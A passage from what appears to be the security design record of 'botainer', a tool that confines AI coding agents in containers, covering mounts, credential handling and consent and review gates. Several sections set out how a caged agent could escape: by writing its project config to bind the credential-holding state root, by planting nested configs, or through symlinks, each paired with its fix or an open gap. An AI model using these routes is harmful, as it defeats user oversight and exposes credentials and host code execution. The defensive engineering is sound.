Verified by composing it. The state root then appears in the mount plan as
`…/.botainer → /data  rw  [user] user-declared in config.yaml`, which hands the
container your login and every project's state, writable.

**What to do about it:** do not put `~/.botainer`, or any parent of it, in
`mounts.extra`. If the agent needs something botainer keeps, request that
component by name.

**What is being fixed:** the resolved state root is being added to the
bind-source denylist, so the configuration above is refused rather than
honoured. Until that lands, this section describes a strong default with a known
gap — not a guarantee.


## 4cv. Disk-full and quota errors surface as refusals, not tracebacks

`write_secure` — the chokepoint every state write funnels through — let
`OSError(EDQUOT)` propagate. On a real cluster that surfaced as nine frames of
click internals and an errno, at `botainer start`:

    OSError: [Errno 122] Disk quota exceeded: '…/state/<uuid>/.meta.json.tmp.…'

Not a security change; recorded here because `secure_write` is on the surface
list and because the failure mode matters: the user could not tell whether state
had been corrupted. It had not — the write is atomic and never began — and the
refusal now says so, alongside `botainer where` (which already reports per-project
sizes and marks scratch/packages disposable, `data/`+`sessions/` not) and the
scratch relocation for the HPC case.

New `RefusalCategory.STATE_WRITE_FAILED`: a full disk is not a config error and
had no category that told the truth.

**The quota was itself caused by §4cq's defect** — `/scratch` under the state
root on a home filesystem, so the agent's bulk data consumed the home quota. The
design flaw and its consequence surfaced hours apart on the same machine.


## 4cp. Shared mode is read-WRITE, and every surface says so (#137 partial)

The shared-credential bind is `rw`, so every surface must say **read AND
overwrite** — not "can read". Four user-facing sites said "can read". All four now say **read AND
overwrite**, and say what that means: overwriting it changes which account every
shared-mode project runs as.

    plugins/agent-claude-shared/botainer-plugin.yaml
    plugins/agent-claude-shared/hooks/pre_session.py   (the bind's provenance)
    botainer/cli/init.py                              (the shared-mode warning)
    botainer/cli/auth.py                              (`auth use shared`)

Each also states WHY it is rw, because the reason is not a wart: the agent must
be able to write its refreshed token back, and "the container can persist a
refresh" and "the container can overwrite the credential" are the same
capability. There is no mount configuration that grants one and withholds the
other — read-only was considered and would guarantee a DEAD credential after
the first refresh, since the rotation happens provider-side whether or not the
result can be saved (§4cq).

This is a consent-accuracy fix, not a security fix. The behaviour is unchanged
and the security contract (§1's bind inventory) always recorded it correctly as
`rw`. What was wrong is that the places where a user DECIDES were softer than
the place the decision was recorded.

**The blast radius is botainer's own shared store**, `<state_root>/shared-auth/`
— created by `botainer auth login --shared`. The user's own `~/.claude` and the
macOS Keychain are never bound and never read by the session path. "Host-wide"
in `auth doctor` means "shared across botainer projects on this host"; it does
not refer to the native client's separate login store.


## 4dh. Child-job containment allows the same roots a session does

`hpc/jobs.py::child_core_binds` required both `/packages` and `/scratch` to
resolve under the state root — a copy of `compose_session`'s rule, made when
that was the rule. When §4cq gave `/scratch` its own root, the session learned
and **the copy did not**. Observed on a real cluster:

    dispatcher: cycle error (Refused): [mount-source-denied] child job scratch
    bind source /…/scratch/…/botainer/<uuid> resolves outside the user state
    dir /…/.botainer/state; symlink-escape defense.

Every cycle, forever. A user who configured two-tier storage got a session that
launched fine and a dispatcher that could never run a job.

**Mechanism class: a check COPIED rather than SHARED.** The defence is unchanged
in kind — every child bind source must still resolve inside a root the launcher
chose, never anywhere the agent can influence — scratch is now checked against
its own declared root, exactly as the session does. The structural answer is one
containment helper both call; this commit fixes the drift, not the duplication.

Scope of the fix: `child_core_binds` is the single containment point for every
child-job bind — `jobs-explain`, the dispatcher cycle, AND the warm/hot worker
pool all call it. So the pool was broken by the same defect and is repaired by
the same change; there is no second copy to update.

Also here, on the same surface: `dispatcher status` reported whatever pid the
file contained, so a crashed dispatcher read as running while dispatched jobs
sat unread. Liveness is now checked (signal 0) and reports three states —
running / stale / stopped — because "stale" is a failure and "stopped" is a
choice. And `botainer start` warns, before the launch confirmation, when a
project has `job_profiles` and no dispatcher is running: the jobs would be
written to a mailbox nobody reads, with no error visible to the agent.


## 4cn. Hook stderr is surfaced to the user, not discarded (#138)

`run_hook` passes `capture_output=True`, so a hook's stderr lands in
`HookResult.stderr`. **No caller has ever read it when the hook exited 0.**

Measured against the real hook before the fix: `rc: 0`, **113 bytes of stderr
captured, nothing shown**. So none of these has reached a user, ever:

- the shared-auth unknown-file leak canary (`_warn_unknown_in_dir`)
- the #158 anti-poisoning refusal ("does NOT look like a Claude OAuth file;
  backing up rather than back-filling")
- **"back-filled shared credential"** — which announces a HOST-WIDE credential
  change affecting every shared-mode project on the machine

This is the force multiplier under §4cm's three account-crossing paths: it is
why nothing warned, and why any warning added later would also have been
invisible. It had to be fixed before anything that warns.

`plugin_hooks.surface_hook_stderr` is now called at all three `run_hook` sites
(`host_pre_launch`, `pre_session`, `post_session`), and
`test_every_run_hook_call_site_surfaces_stderr` asserts the two counts match,
so a fourth call site cannot quietly reintroduce it.

**The first thing the new channel did was warn about botainer.** With a
REALISTIC shared dir the leak canary fired on every start, because
`_SHARED_ALLOWLIST` was missing two files botainer creates itself:
`.claude.json` — symlinked there by this very hook — and the broker's refresh
lockfile (`refresh_lock._lockfile_path`, derived from the credential filename,
so matched by SUFFIX rather than listed literally: the two live in different
packages and nothing else ties them together).

That canary had therefore been firing on every shared session for as long as
both features have coexisted, into a void. Surfacing the channel is what found
it — which is the point of a warning channel and also its danger: a warn that
fires every time trains everyone to ignore it, and the next real finding goes
with it. **If it starts firing on every run again, the allowlist is stale — fix
the allowlist, never mute the warning.**

Pinned from both directions: `test_a_realistic_healthy_session_is_silent` (a
real install stays quiet) and `test_a_GENUINELY_unknown_file_still_warns` plus
`test_the_suffix_allowance_is_narrow` (the canary was corrected, not muted, and
`.refresh.lock` did not become a wildcard).

**Method note.** My first fixture created only `.credentials.json`, measured
zero bytes, and I committed the claim that this could never become noise. The
property was true of the fixture and false of reality — the third time in two
days an unrealistic fixture produced a confident wrong answer. The tests now
share a `_realistic_shared_dir` helper for exactly that reason.

Also pinned: `test_no_token_material_reaches_the_users_terminal`. Whatever a
hook prints now reaches a terminal and its scrollback, so the hooks are checked
for not printing secrets.


## 4co. Credential event log

`<state_root>/logs/credential-events.jsonl` — append-only, 0600, in a 0700 dir,
a sibling of `state/` and `shared-auth/` and therefore bound into no container.
Same placement rule as the SLURM output dir (§4 directional isolation): a log
the agent can rewrite is worse than no log, because it reads as evidence.

Records what happened to credentials: a symlink relinked, a rotation promoted,
an account change held, an identity restored, first-use recorded. **Never a
token** — not a value, not a prefix, not a length.

That property is structural rather than reviewed: `record()` takes named,
enumerated, typed arguments with no `**kwargs`, so there is no free-form dict to
slip a secret into. `test_there_is_no_way_to_pass_a_token` pins the signature so
adding one later is a deliberate, visible act.

**Purpose.** The event log records credential reconciliation events so that
store divergence, account changes and staleness can be investigated from recorded
state rather than inferred from a later login failure.

Bounded and non-fatal by construction: 5 MB cap (stop appending rather than
rotate — a truncating rotation discards the oldest evidence, which is usually
the interesting evidence), `O_APPEND` with `detail` truncated so a line stays
under PIPE_BUF and concurrent sessions interleave whole lines (pinned by a
forked 8-process test), and `record()` never raises — a session must not die
because its logger could not write.


## 4cm. A PROFILE IS AN ACCOUNT BOUNDARY

This is the rule a broker "self-heal" once violated; it was reverted within the
hour. The user found it by reading the code.

**`--profile` separates ACCOUNTS, not just credential files.** `auth login
--profile work` and `--profile personal` are two different Anthropic accounts on
one host. Any code that moves, copies, prefers or adopts a credential MUST NOT
cross that boundary.

**Name equality is not account equality.** Three ways they come apart, all
reachable today:

- **Isolated mode gives every project its own `default` profile.** Each project
  logs in independently, so two `[default]` profiles in two projects can be two
  accounts.
- **The shared store has no profile at all** — one flat
  `shared-auth/<agent>/.credentials.json` per host. There is nothing to compare
  it against.
- **A user can switch accounts inside one profile** (run out of quota on one,
  log in with another). The directory name does not change.

**There is no sound same-account signal on disk.** The credential file carries
no account, org, user or subject id; nothing records which login minted it; and
rotation destroys the only natural link, because refreshing mints a successor
and invalidates the predecessor (EF-1) leaving the successor with no trace of
what it replaced. Lineage has to be recorded AT WRITE TIME or it does not exist.

**What was shipped and reverted (f99349e, reverted 5f77fee).**
`_adopt_live_sibling` walked `shared-auth/<agent>/` plus
`state/*/data/<agent>/profiles/*/` for every project and every profile, and
adopted whichever holder had the newest live access token — ranked by expiry
alone. A broker serving account A could have adopted account B's token, used it
for the session, and written it into the shared store, from which every
mount-mode project would pick it up on next start. Wrong account, wrong
billing, wrong org, and spreading rather than local.

Same class as §4ca (#120, cross-agent credential exposure) on a different axis,
three days later.

**Current state: no adoption happens.** The broker refuses and asks the user to
re-authenticate, as before. The reported bug — the broker dying while a live
token sits in a project file — is UNFIXED and tracked on #135. A recovery that
can cross accounts is worse than no recovery.

**The rule for anything built here**, from
internal design note DN-014:

1. Adopt only a holder whose ACCESS token is still live — never refresh a
   sibling to save yourself; that spends a single-use token and takes the
   sibling down.
2. Never write an older token over a newer one.
3. Same recorded lineage, or refuse. No heuristic, no profile-name matching, no
   "probably the same".
4. Any lineage record must be host-private and outside every bound path — the
   same directional-isolation requirement as the SLURM output dir — or it is
   plantable by a caged agent and worthless.
5. An adoption moves a credential between files; it must be visible in
   `auth doctor`, never silent.

**Not bulletproof, and the residual is named**: even a proven same-ACCOUNT check
cannot distinguish two independent logins on that account, so adoption can still
disturb a session the user is actively running. That is why rule 1 (live access
token only, spend nothing) is load-bearing rather than an optimisation.

#110 removes the class entirely — one sole holder of the refresh token,
mount-mode projects handed a short-lived access token — and is the real answer.


## 4ck. SECURITY: a copied project is detected before it inherits credentials

The clone/fork prompt — "moved checkout / new independent copy / abort" — has
existed since v0.0.13 and **had never been reachable**.

`append_path_history` writes records: `{path, first_seen, last_seen, host}`,
migrated from an earlier plain list of strings. `resolve_identity` still did
`[str(x) for x in raw_hist]`. Each record stringified to
`"{'first_seen': ..., 'host': ..., 'path': ...}"`, which

- never equals the current path, so the "this is where I saw it last" branch
  was unreachable, and
- is not a path that exists, so `Path(last_known).exists()` was always False,
  which sent EVERY invocation down "prior path is gone -> moved, record
  silently".

**Consequence.** Copy a project directory and run from the copy: it silently
attached to the ORIGINAL's state dir — same `/packages`, same `/scratch`, same
per-project credential dir — with no prompt and no message. Two working copies,
one credential store, and nothing said so. That is exactly what the prompt
exists to prevent, and it is the same shape as §4ca (#120): a credential
reachable from a context the user did not intend.

**Same defect class as everything else this week**: two readers of one field,
updated at different times, nothing comparing them. `list_projects` WAS taught
the record shape — its comment even says "path_history can be either old-shape
(list[str]) or new shape (list[dict])" — and `resolve_identity` was not.

**Fix is a chokepoint, not a patch.** `state_dir.path_history_records` is now
the only reader of the field, and `state_dir.last_known_path` the only
"where was this last" answer. The latter prefers a record from THIS host, which
is what the host-keying was for: a project reached from a laptop and from a
cluster has different paths, and without host-keying every switch reads as a
move.

**Behaviour change, deliberate.** Running from a copy while the original still
exists now prompts interactively, or refuses non-interactively with
`--accept-identity-change` / `--fork` in the message. Anyone who has been
running two copies has been sharing one state dir without knowing; they will
now be told, once, and asked which they meant.

Observed end-to-end, all three cases, through the real CLI: re-run in place is
silent; a copy with both live refuses; a genuine move (original gone) proceeds
and keeps the uuid.


## 4cq. `/scratch` may live outside the state root

**The single-root assumption had been baked into a security guard**, which is
what made a storage-placement question expensive instead of trivial.

`ProjectPaths` put state, packages and scratch under one root, and
`composition.py` refused any bind source resolving outside it. Three things with
three lifetimes:

    state     credentials, project uuid, plugins, .sif   small, MUST persist
    packages  pip/npm caches                             large, rebuildable
    scratch   the agent's bulk intermediates             large, disposable

On HPC those belong on different filesystems. One root forces the user to choose
which to get wrong: the state root on `$HOME` and bulk data eats the quota; on
scratch and the purge takes the credentials. `botainer hpc setup` printed a
storage section advising exactly the right two-tier layout, and
`internal design note DN-008:245` specified `scratch_template` "resolves at session
compose" — **the launcher never resolved it.** The product advised a layout it
could not implement.

**What changed.** `ProjectPaths.scratch_root` (host-side, launcher-resolved
only — the agent has no path to set it) relocates ONLY scratch. State, home and
packages stay put, deliberately: moving `base` instead would reintroduce the
hazard `hpc setup` warns about.

**What did NOT change: containment.** The guard still requires every bind source
to resolve inside a root the launcher chose. Scratch is now checked against its
OWN declared root rather than the state root — same discipline, correct root.
Relaxing WHERE a source may live must never relax WHETHER it is contained, or
this becomes the umbrella-bind class it was built to prevent. A test pins the
escape case.

**Existing installs** have their scratch on the state root already.
`tools/pkg/relocate-storage.sh --component scratch` moves it: dry-run by default, copy-verify-remove
rather than a bare `mv` (a partial cross-filesystem `mv` on a cluster leaves you
with neither copy), refuses a non-empty destination, and never touches `data/`,
`home/`, `packages/` or `sessions/`.

**Where the value comes from, and why it is one place.** `for_project` resolves
the active cluster profile's scratch template at the single chokepoint every
caller passes through. There are nine callers; a per-caller lookup would be nine
chances to forget, which is how the two-tier layout stayed unimplemented while
`hpc setup` advertised it. It returns None — today's behaviour — when no profile
is active, no template is set, or a variable will not expand. Silence rather
than a guess: relocating a user's bulk data somewhere they did not ask for is
worse than leaving it where it was.

**The value is host-side only.** A cluster profile is read by the launcher from
the user's own state root. Nothing the agent can write reaches this, and the
resolved path is still subject to the containment check above.

**Follow-up — the fallback must never be silent.** The first version
returned "unchanged" without a word when a template could not be resolved. Six
shipped profiles interpolate `${SLURM_JOBID}`, which is unset on a login node —
including all four `yale-*` ones — so those users would have configured two-tier
storage, received home-volume scratch, and had no way to learn it. A broken
`cluster.yaml` fell back just as quietly. Both now warn once per template,
naming the template, its expansion, the reason, and the consequence. A fallback
nobody is told about is indistinguishable from a setting that never took.

(`${SLURM_JOBID}` is also wrong IN KIND for this field: botainer's `/scratch` is
per-project and persists across sessions, while a job-scoped path would be a
fresh empty directory every job. Correcting the six templates is tracked
separately.)

**Why the drift survived:** `check-claims-vs-impl.sh` exists for exactly this —
a design claim contradicted by the implementation — and had no row for
`scratch_template`. Added.


## 4de. The consent fingerprint excludes per-session paths

`_capability_fingerprint` hashed each bind's `source`. Two binds point into the
session's own ephemeral directory:

    <state>/sessions/<sid>/AGENT_ACCESS.txt  ->  /workspace/.botainer/…  (ro)
    <state>/sessions/<sid>/AGENT_HINTS.md    ->  /workspace/.botainer/…  (ro)

`<sid>` is minted per launch, so the fingerprint changed every launch and the
gate reported **"capability set changed since last launch"** when nothing had.

**This is the same defect the code already guarded, one bind-mode over.** The
`Audit L5` comment immediately above normalises the broker's per-session SOCKET
source for exactly this reason — consent fatigue — but keys on
`mode == socket`. These two are `ro` and slipped past.

**Why it is a security defect and not cosmetic.** The gate is the only control
between the user and a REAL capability change: `network none -> internet`, a new
bind, a switched auth mode, a newly enabled plugin. A gate that fires on every
launch teaches the user to approve without reading, and then the one real change
goes through unread. This project's own rule: a warning that fires every time is
a bug or a lie, never scenery.

**Fix, and its mechanism class.** Normalisation now keys on the PROPERTY — the
source lies under `<state>/sessions/<this session>/` — rather than on a mode
enum, so a future ephemeral bind in a third mode cannot reintroduce it. The file
*tail* is preserved (`<this-session>/AGENT_HINTS.md`), so binding a DIFFERENT
per-session file at the same target still re-confirms; a second test pins that,
because dropping the source entirely would have silenced the gate instead of
correcting it.

Found by a UX emulation walking the road as a user, and independently visible in
a real cluster transcript.


## 4du. A project config may not name the state root as a bind source

**What it prevents.** `/workspace` is read-write in the cage, so a caged agent
can write `mounts.extra` into the project's own `config.yaml`. Before this, a
source of `$MY_BOTAINER` composed with NO refusal — measured, `inspect --json`
rendered `<state root> -> /data rw`. That is not a secret at the edges; it is
the whole store: `state/<uuid>/` for every OTHER project on the host including
their credentials, `shared-auth/agent-*/` (the host-wide login), and read-write
on `plugins/*/hooks/*.py` — which botainer EXECUTES ON THE HOST as the user at
the next `start` in ANY project. Host code execution, persisting after the
session that planted it has ended.

**Why it is not a denylist entry.** `DENYLISTED_SOURCES` is checked for every
bind, and botainer's own binds legitimately live inside the state root.
Measured on a default session: **eight binds, SEVEN of them inside the root**
— six `core` and one `plugin`: `/packages`, `/scratch`, `/home/user`, the
`.botainer` subtree, the per-plugin data dir. Adding the root to that tuple
refuses all seven and breaks every launch.

*(An earlier version of this paragraph said nine and eight. That count was taken
with the attack's own `mounts.extra` entry still in the config — I measured the
state I had just created rather than the default one. Corrected by re-running it
clean. The same version claimed `MY_BOTAINER` is "routinely moved to `$SCRATCH`"
on HPC; that is false of this product, which REFUSES a state root outside
`$HOME` — and that refusal is precisely why a user reaches for a symlink
instead, which is the failure mode below.)*

**Mechanism class: STRUCTURAL on WHO ASKED; a FILTER on WHERE IT POINTS.** The
provenance half is genuinely mechanism-derived. The containment half is a string
comparison over two normalised paths, and a filter is exactly what it is — this
contract's own rule is that calling a filter structural tells a reader not to
ask "and what if the two paths do not normalise the same way?", which is the
question that found the defect recorded below. The rule is not *which path* but
*who asked*; `Provenance.USER` is exactly "the project's config.yaml named
this", which is exactly the attacker-reachable channel; `core` and `plugin`
binds are untouched. A future core bind inside the state root needs no
exemption, and a future config-supplied one cannot acquire one.

**What is checked, and in both directions.** The source and its `realpath`, each
against the resolved state root, via the same ancestor-aware helper the hard
denylist uses. So naming the root, naming anything under it, naming an ANCESTOR
of it, and naming a SYMLINK whose target is any of those are all refused. The
symlink case is not hypothetical — the agent can create the link in its own
read-write workspace, and dropping the `realpath` candidate kept every other
test in this area green.

**It fails CLOSED.** If the state root cannot be resolved, a config-supplied
bind is refused with a message saying the check could not run — not allowed.
A guard that cannot locate what it protects must not answer "allowed"; that is
the shape this contract records elsewhere, where a swallowed lookup became a
plausible-looking permission. Note this branch is DEFENSIVE and not reachable
through today's CLI, because every command resolves the state root earlier than
it composes a mount plan — it is pinned anyway, since "unreachable today" is the
property that rots silently.

**An admin can still vouch for it, and that is deliberate.**
`trusted_source_roots` re-allows the source, exactly as it does for `~/.ssh` and
the other sensitive-home paths. That hatch is **site-policy only**: the root-owned
`/etc/botainer/policy.yaml`. A user-level `trusted_source_roots` is
INOPERATIVE — policy composition intersects it with the site default, which is
empty, so a user policy listing the root changes nothing (driven; the
intersected value is `[]`). An earlier version of this paragraph said "or the
user policy", which was wrong and would have told a reader they had a knob they
do not have. **The practical consequence is
worth stating plainly: a site that trusts `$HOME` re-admits the state root with
it, because `~/.botainer` sits under `$HOME` by default.** That is the
pre-existing semantics of the hatch, not something this entry introduces, but a
reader deciding whether to trust `$HOME` should know it includes the credential
store and the host-executed hooks.

The first version of this rule refused absolutely and ignored the hatch. The
test suite caught it — `test_trusted_source_root_reallows_home` failed, because
`$HOME` is an ancestor of the state root — and the right answer was consistency
with the existing design rather than an invention.

**A refuting review found this rule doing NOTHING on the target platform, and
that is worth recording rather than quietly fixing.** The first version resolved
the bind SOURCE but compared it against the state root as returned — and
`ensure_user_state_dir` resolves symlinks on its `MY_BOTAINER` branch while
returning `Path.home() / ".botainer"` verbatim on its default one. So on a
default install whose `$HOME` traverses a symlink — `/home/<netid>` →
`/gpfs/...`, the ordinary cluster layout, with no attacker involved — the
resolved candidate and the literal root were different strings and nothing
matched. Both sides are resolved now, and a test pins the symlinked-home case.

**What this does NOT fix.** `mounts.extra` can still name other sensitive host
paths not on the denylist; that list remains a list of literals, and widening
it to a resolved ancestor-aware rule for the general case is tracked separately.
This entry closes the botainer-state-root route only.


## 4dt. A nested project WARNS and names both roots; it no longer refuses

**What changed.** `find_project_root` used to raise `IDENTITY_AMBIGUOUS` when a
botainer project sat inside another one. It now returns the NEAREST — the
normal answer — and prints a warning naming both roots and which one is being
used.

**The hazard is unchanged, and is still why anything is printed.** The
null-bind mask that makes `.botainer/config.yaml` trusted input is structural
but covers exactly one path: `_MASK_REQUIRED_UNDER_RW = {"/workspace":
("/workspace/.botainer",)}`. Project discovery, its consumer, walks up to the
nearest `.botainer/project-id`. The mask's domain is strictly smaller than its
consumer's, so nothing masks `/workspace/anysubdir/.botainer/` — which a caged
agent, rw on its workspace, can create. A user who later ran a botainer command
from that subdirectory ON THE HOST would load an agent-authored config driving
`plugins_enabled`, `mounts.extra`, `network.mode`, `agent_permissions` and
`image`.

**Why the refusal went anyway.** The commands that reach this function resolve a
project by WALKING UP and take no project path of their own, so a stray
enclosing project made every one of them unusable — and the refusal's remedy,
"run the command with an explicit project path", named something they do not
have. A refusal whose only remedy does not exist is a dead end, not a control.

**Two claims in the first draft of this section were FALSE, and a refuting
review disproved both.** They are recorded rather than quietly deleted, because
the second one was a live regression and the first is still load-bearing
elsewhere:

* *"no botainer command takes an explicit project path"* — false. **Nine
  `botainer hpc` subcommands take `--project`** (`jobs-status`, the dispatcher
  group, and others). They pass a path straight in and never reach
  `find_project_root`, so they were unaffected either way — but the sentence as
  written was wrong, and the parenthetical that "measured" it measured a
  different question: it counted call sites of `find_project_root`, which is the
  check that agreed with what I already believed.
* *"an agent cannot write ABOVE its own workspace root"* — false as stated, and
  this one was the whole justification. Nothing relates a `mounts.extra` source
  to the project root, so a project config can bind the parent directory rw; the
  mask invariants reason about container TARGETS, never about a host directory
  reachable at a second target. It is consent-gated — the first-launch confirm
  lists the bind and the gate re-fires when the bind set changes — which bounds
  it to "consented, not silent", and it is tracked as its own queue row. The
  narrower true statement, which is what this section now rests on, is that an
  agent can only plant a `.botainer/` in a tree that was bound as its workspace,
  and that only happens when a session RUNS.

**What the warning is keyed on.** Whether an ENCLOSING project has ever run a
session — the one fact that separates the two shapes. EVERY enclosing project is
consulted, not just the nearest: with `work/` having run and `work/foo/` planted
empty, the nearest-only first draft reported "No session has ever run" about
`work/foo/bar`, a false all-clear regarding a tree that HAD been bound, produced
by one `mkdir`. Worst-known-wins, and every root in the reported state is named
so there is no index left to be wrong. And a session DIRECTORY is not a session:
`botainer inspect` launches nothing and still creates one, so the measurement is
a record whose `started_at` is set. Three states,
and the third matters most: HAS run (says an agent held that tree rw, and what a
config controls); NEVER ran (stated as a measurement, qualified to "by that
route", and explicitly NOT as a safety verdict — see §4dc); and CANNOT TELL,
which an unreadable or absent state root must produce rather than silently
reading as "never". That last case was a real defect in the first draft of this
change, caught by its own test: `ensure_user_state_dir(create_if_missing=False)`
returns paths for a root that is not there, so a missing root answered "never
ran" — a missing measurement reported as a clean bill.

**Mechanism class: FILTER, and weaker than what it replaced.** A warning does
not stop anyone. The user may read past it, and on a non-tty it is stderr text
like any other. This trades a blocking refusal for a disclosure that permits
project discovery to continue. The STRUCTURAL fix
is unchanged and unbuilt: widen the null-bind mask so that no `.botainer/`
anywhere under a bound workspace is agent-writable, at which point the inner
project cannot be planted and the warning becomes informational. Tracked, not
done.

**What this change does and does not touch.** No bind, env var, capability grant,
plugin envelope or cage flag is edited, and the mask itself is untouched. But it
would be false to write "nothing about the cage changes" and stop: where the old
code REFUSED, nothing composed at all, and now a session composes from the
nearest config. If that config is agent-authored, its `mounts.extra` reaches the
rendered argv — driven and observed. That path is consent-gated (the first-launch
confirm lists every bind; the gate re-fires when the bind set changes), so the
user sees it before anything runs. The honest statement is: the cage is built the
same way from the same inputs, and this change alters WHICH config is allowed to
be one of those inputs, from "none, the command stops" to "the nearest, with a
warning and a consent prompt".

**No suppression switch.** The first draft had a `warn=False` parameter with zero
production callers — an off-switch for the only control left here, of the shape
this contract records elsewhere as a loaded gun. It is gone. In its place the
warning fires once per root per process, which no caller can turn off.

**AND THAT DEDUP DOES NOT SPAN `hpc submit`, which is measured, not assumed.**
An earlier version of this section said `hpc submit` resolves the project three
times and that warning-once "solves" it. Both halves were false. Counted by
running it in a nested project, the warning appears **twice** — and identically
with the dedup deleted, because `botainer/cli/hpc.py` re-execs botainer as a
SUBPROCESS (`subprocess.call([sys.executable, "-m", "botainer.cli.main", ...])`),
so a process-global set cannot reach across it: one print in the parent, one in
the child. The "three" came from counting `find_project_root` call sites in the
source rather than running the command — the exact substitution of a shadow for
the thing that this contract's own method rules forbid.

The consequence is a DESIGN CONSTRAINT, not just a corrected number: any
per-invocation state about this hazard — including a consent record, should one
be added — must live on DISK, because the process that asks and the process that
acts are not always the same process.


## 4dc. A tip may state a fact and point; it may never render a safety verdict

The RULE at the top of `botainer/tips.py` — *a tip may state a FACT and POINT at
the security surface; it may never render a comparative or absolute safety
verdict* — requires enforcement on both core and plugin tips. Previously, the
manifest validator did not enforce that restriction.
`ContributesDecl._validate_user_tips` checked non-empty, charset and length,
with the rule written in a comment directly above it.

Demonstrated, not inferred: a manifest declaring `user_tips: ["The viewer is
SAFER … and PROTECTS your clipboard — it is secure."]` was accepted unmodified,
and inserting a verdict into a live core tip passed both `test_tips.py` and
`check-claims-vs-impl.sh`.

A check that only walks `BASE_TIPS` misses plugin-provided tips, including
`plugins/browser/botainer-plugin.yaml`. Both sources need the same validation.

Now a `ValueError` at manifest load, tested across both surfaces. Zero shipped
tips trip it.

**Mechanism class: FILTER, and the code says so.** A tip is a `str`, so a
verdict is exactly as *representable* as a fact; no word list closes that.
"redundant", "unnecessary", "you don't need to worry about" are all missed —
note that a sibling fix in the same round described FileVault as making a
precaution "redundant" — a verdict, in a one-liner, exactly as forbidden. The
structural fix is to make a verdict **unrepresentable**: `Tip(fact=, pointer=)`
with a REQUIRED pointer, resolved against the live click tree or a doc path
present in the *wheel*. Tracked, not done.

Why a fourth checker would not have helped: every mechanism that works on this
surface resolves a **reference** against the running system (96 shipped command
names, every flag a refusal mentions, the tip drift rows). A verdict names
nothing resolvable. That is why this class survived a gate built the same day it
was caught.


## 4da. The review gate matches hook PATHS, not filenames

The maintainers' list of files whose modification triggers the pre-merge review
protocol enumerated hook
filenames: `pre_session.py`, `start_viewer.py`, `stop_viewer.py`, `login.py`.

Eleven hook filenames exist. The six unmatched:

| hook | what it does |
|---|---|
| `start_broker.py`, `stop_broker.py` | contribute binds **and** env into the cage |
| `start_proxy.py`, `stop_proxy.py` | same |
| `post_session.py` | writes the **shared credential store** |
| `status.py` | reads session state |

A commit touching only those files matched no pattern, so
`check-security-surface.sh` detected no surface change, demanded no
`Reviewed-By:` trailer and required no protocol run. Measured on `c9952fb`,
whose diff contains `start_broker.py`, `stop_broker.py` and `login.py`: the gate
reported one of the three.

**Mechanism class: this was a FILTER presented as coverage.** An enumeration
holds only while every future contributor remembers to extend it, and across
four plugins and six filenames nobody ever did. The pattern is now
`plugins/*/hooks/*.py` — a **property**: there is no such thing as a hook
outside the security surface, so a new hook is covered the moment it is created.

Backed up by `tests/integration/test_plugin_hook_integrity.py::
test_every_hook_file_is_on_the_security_surface`, which fails naming any hook
file that matches no pattern. That test exists to cover the residual structural
gap — someone narrowing the glob back to filenames, or adding a hook directory
the glob does not reach.

Scope note, so this is not read as worse than it is: the gate is a **process**
control, not a runtime one. Nothing about what those hooks can do changed, and
each has in fact been reviewed at some point. What was absent is the mechanical
guarantee that the next one will be.


## 4cg. by-name alias allocation is collision-safe

`state/by-name/<name>-<short-uuid>` → `../<uuid>` is how a project gets a
recognizable name. `<short-uuid>` is 8 hex chars — 32 bits — so two projects
clash only if they share a sanitized name AND a 32-bit prefix:

| projects on the host | P(any pair collides) |
|---|---|
| 100 | 1.2e-6 (~1 in 870,000) |
| 1,000 | 1.2e-4 (~1 in 8,600) |
| 10,000 | 1.2e-2 |

and since only SAME-NAMED projects can actually clash, the realistic figure is
nearer 1e-9. Eight characters is a fine choice.

**The odds were not the problem; the failure mode was.** On finding the alias
taken, the old code called `unlink()` and pointed it at itself — so the rare
event was not an error but "one project silently becomes unreachable by name".
Demonstrated directly against the pre-change code: two projects, one alias,
pointing at the second.

`_unique_link_path` now lengthens the uuid portion instead
(`analysis-deadbeef`, `analysis-deadbeef1`), and an alias that already belongs
to a project is returned as-is rather than recreated. Two projects can no
longer share one alias at any probability.

**Why this is worth structure rather than odds:** the plan is to INVERT the
layout — make `<name>-<short-uuid>` the real directory and the bare uuid a
symlink to it, so people can navigate their own state dir. Under that layout a
collision stops being a lost shortcut and becomes **two projects sharing one
state directory**: same `/packages`, same per-project credential dir. That is
not something to leave resting on a probability estimate.

**Documented limit, not an oversight:** which of two colliding projects gets
the 8-char form depends on which registered first. An existing alias never
moves (pinned by `test_an_existing_alias_is_never_moved`), so this is stable
for any real install; only rebuilding `by-name/` from scratch in a different
order could swap two colliding projects' aliases. Fixing that would mean
rewriting the incumbent's alias out from under anyone who has the path in a
shell history — a worse trade.

**Separately verified for the inversion:** composing a session and reading the
actual bind list shows every state-dir bind source is `state/<uuid>/<subdir>` —
`packages`, `scratch`, `home`, `data/<plugin>`, `sessions/<sid>/<file>`. The
agent never sees `state/`, and never even sees its own `state/<uuid>` root. So
the symlinks the inversion would introduce are out of the cage's reach. The
enumerators do NOT yet agree, though: `auth_doctor.py` skips symlinks when
walking `state/`, `state/dir.py:list_projects` skips only the name `by-name`.
Inverting without fixing that would list every project twice. Tracked with #124.


## 4cf. An interface's accepted values must match what it implements (#128)

A flag that accepts N values and implements one is a lie told in the help text.
All five shipped that way; all five were individually defensible; nothing
compared the flag's promise against its body.

| surface | what it claimed | what it did |
|---|---|---|
| `start --auth-mode` | `[isolated\|shared\|proxy]` | omitted `broker` — the mode that survives concurrent sessions and the one we recommend — while offering `proxy`, which is dead on arrival (#59) and refused outright on HPC |
| `browser` under codex | an MCP browser for "the agent" | the config file was written, bound and valid; only Claude Code gets `--mcp-config`, so codex silently had no browser tool |
| `init --agent` | free-text agent name | accepted `claude-shared` — an auth MODE — then asked for `agent-claude-shared-shared`, a name that has never existed, and fell back silently |
| `auth use --family` | any family | `--family claude` (an AGENT, not a family) printed "unknown family; skipping" and then **"already in the requested mode; nothing to change."** and exited 0 |
| `hpc build` | build the project's image | defaulted to the literal `agent-claude`, so a codex user waited out a ten-minute build and got the wrong image |

**The fixes are structural where they can be.**

- **One list, checked against the manifests.** `botainer/auth_modes.py` holds
  `AUTH_MODES` and every CLI surface imports it.
  `tests/integration/test_auth_modes_agree.py` fails if it does not match the
  set of `auth_mode:` values the bundled plugin manifests declare — the
  manifests being what composition actually dispatches on — and separately
  scans for any hand-written `click.Choice([...])` mode list. Verified by
  reintroducing the original 3-item literal: the scan test fails on it.
- **MCP delivery refuses instead of no-opping.** Compose now raises
  `plugin-dependency-unresolved` when a plugin contributes `mcp_servers` and
